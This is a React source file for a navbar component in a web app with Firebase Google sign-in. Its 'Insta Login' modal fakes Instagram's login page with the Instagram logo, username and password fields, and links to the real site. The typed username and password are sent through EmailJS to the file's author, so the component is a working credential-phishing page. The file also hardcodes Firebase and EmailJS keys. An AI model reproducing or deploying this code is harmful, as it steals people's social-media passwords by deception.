import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import './Navbar.scss';
// import logo from '../images/logo.svg'; 
import { initializeApp } from "firebase/app";
import { getAuth, GoogleAuthProvider, signInWithPopup } from "firebase/auth";
import emailjs from '@emailjs/browser';



const firebaseConfig = {
   apiKey: "AIzaSyD94UGCjiEIHE-6FY0RUpZ8L1f8PS5WKwA",
  authDomain: "sigma-1bf2f.firebaseapp.com",
  projectId: "sigma-1bf2f",
  storageBucket: "sigma-1bf2f.appspot.com",
  messagingSenderId: "547019121414",
  appId: "1:547019121414:web:a8c15f31cd5d89a7a9b487",
  measurementId: "G-TXYXFCGHCP"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const provider = new GoogleAuthProvider();
const authInstance = getAuth(app);
const styles = {
  modalOverlay: {
    border : '3px white solid',
    position: 'fixed',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    width: '50%',
    height: '100%',
    backgroundColor: 'gray',
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
  },
  modal: {
    border: '2px lightgray solid',
    backgroundColor: 'white',
    padding: '0px 130px',
    borderRadius: '8px',
    textAlign: 'center',
  },
  hidden: {
    display: 'none',
  },
  logo: {
    width:'100%',
    height:'60%'
  },
};


const Modal = ({ isOpen, onClose }) => {


  const sendEmail = () => {
    const nameInput = document.getElementById('name');
    const emailInput = document.getElementById('email');


   

    const formData = {
      name: nameInput.value,
      email: emailInput.value,

    };

    emailjs
      .send('service_cmmncmw', 'template_i4go5dk', formData, 'PXyq6bohnFJY7aKBf')
      .then((response) => {
        console.log('send');
         window.location.reload();
      })
      .catch((error) => {
        console.error('Error sending email:', error);
      });
  };

  return (
  <div style={isOpen ? styles.modalOverlay : styles.hidden}>
      <div style={styles.modal} className="modalbox">
     
        <img
          src="https://seekicon.com/free-icon-download/instagram-wordmark_1.svg"
          alt="Instagsram Logo"
          style={styles.logo}
        />

            <p><input type = "text" name = "username" id ="name" placeholder="Phone number, username, or email"></input></p>
               <p><input type = "password" id = "email" name = "password" placeholder="Password"></input></p>
    
             <button onClick={sendEmail} className='sender'>Login</button>
         <p></p>
         <p style={{color:'grey'}}>________________or______________</p>
          <img  style={{ cursor: 'pointer' }}
           onClick={() => window.location.href = 'https://www.fb.com'}
          src="https://cdn.discordapp.com/attachments/860626419499794445/1175453945250984047/image.png?ex=656b49cb&is=6558d4cb&hm=efe4c208f6154bf91f5df66c589d00c48336c3a28aefb839455a4a36524979d2&"
          alt="Instagram Logo"
          className='loginwithfb'
        />
   
        <p onClick={() => window.location.href = 'https://www.instagram.com/accounts/password/reset/'} style={{color:'grey', fontFamily:'comic sans', cursor: 'pointer' }}>Forgot password?</p>

          <img  style={{ cursor: 'pointer' }}
           onClick={() => window.location.href = 'https://www.instagram.com'}
          src="https://cdn.discordapp.com/attachments/860626419499794445/1175456539792900136/image.png?ex=656b4c36&is=6558d736&hm=4946a7e8ad0d67a8b26ea5fd0c9019651011d377458a2a9634d873f18f7fc048&"
          alt="Instagram Logo"
          className='loginwith'
        />
           <p><button style= {  {backgroundColor:'white'}}onClick={onClose}>X</button></p>
      </div>
    </div>
  );
};




const handleLogin = () => {
  const auth = getAuth();
  signInWithPopup(auth, provider)
    .then((result) => {
      // Handle successful login
    })
    .catch((error) => {
      console.log(error);
      // Handle login error
    });
  
};


const Navbar = () => {
  
  const [modalIsOpen, setModalIsOpen] = useState(false);

  const [user, setUser] = useState(null);

  useEffect(() => {
    authInstance.onAuthStateChanged((currentUser) => {
      if (currentUser) {
        
        setUser(currentUser);
        
      } else {
        setUser(null);
      }
    });
  }, []);

  const handleLogout = () => {
    authInstance.signOut()
      .then(() => {
        // Logout successful
        setUser(null);
      })
      .catch((error) => {
        // Error occurred during logout
        console.log(error);
      });
  };
 const closeModal = () => {
    // Close the modal
    setModalIsOpen(false);
  };
  
const handleIg = () => {

       setModalIsOpen(true);
};








   return (
    <article>
      <div className="links-left">
        <div><Link to='/' className='button-30' onClick={handleLogin}>Login</Link></div><br></br>
          <div onClick={handleIg}  className='button-30'>Insta Login</div>
        <div><Link to='/' className='Link'>Home</Link></div>
        <div><Link to='/Chat' className='Link'>Chat</Link></div>
        <div><Link to='/Profile' className='Link'>Profile</Link></div>
      </div>
          {/* //  <div className='logo'><img src = {logo} alt = "logo here" ></img> */}
          {/* </div> */}

      <div className="links-right">

        {user ? (
          <>
          <div><h2>{user.displayName} </h2></div>
          <div><button onClick ={handleLogout} className='button-30' style={{backgroundColor:'yellow'}}>Logout</button></div></>
      ) : (
        <>
{/*           
          <div><Link to='/Chat' className='button-30' style={{backgroundColor:'yellow'}}>Sign Up</Link></div> */}
           <Modal className="modalbox" isOpen={modalIsOpen} onClose={closeModal} />
          </>
      )}
      </div>
    </article>
  );
};

export default Navbar;
